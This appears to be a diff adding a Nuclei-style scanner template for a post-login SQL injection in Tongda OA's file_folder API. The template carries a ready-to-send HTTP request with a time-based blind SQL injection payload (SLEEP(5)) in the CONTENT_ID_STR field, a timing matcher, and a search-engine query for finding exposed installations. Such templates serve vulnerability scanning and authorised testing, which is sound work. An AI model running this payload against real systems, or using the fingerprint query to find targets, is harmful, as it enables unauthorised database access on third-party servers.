@@ -1,0 +1,49 @@
+id: poc-45f488dd1733fd454f85
+info:
+  name: 通达OACONTENT_ID_STR存在后台SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/45f488dd1733fd454f8564047d41c6c0
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 45f488dd1733fd454f8564047d41c6c0
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'POST /general/file_folder/api.php HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
+
+    Cookie: {cookie}
+
+    Connection: close
+
+    Host: {{Hostname}}
+
+    Pragma: no-cache
+
+    x-requested-with: XMLHttpRequest
+
+    Content-Length: 82
+
+    x-wvs-id: Acunetix-Deepscan/209
+
+    Cache-Control: no-cache
+
+    accept: */*
+
+    Accept-Language: en-US
+
+    content-type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    CONTENT_ID_STR=-@`''` AND (SELECT 8678 FROM (SELECT(SLEEP(5)))UUxI)&SORT_ID=59&FILE_SORT=1&action=sign'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
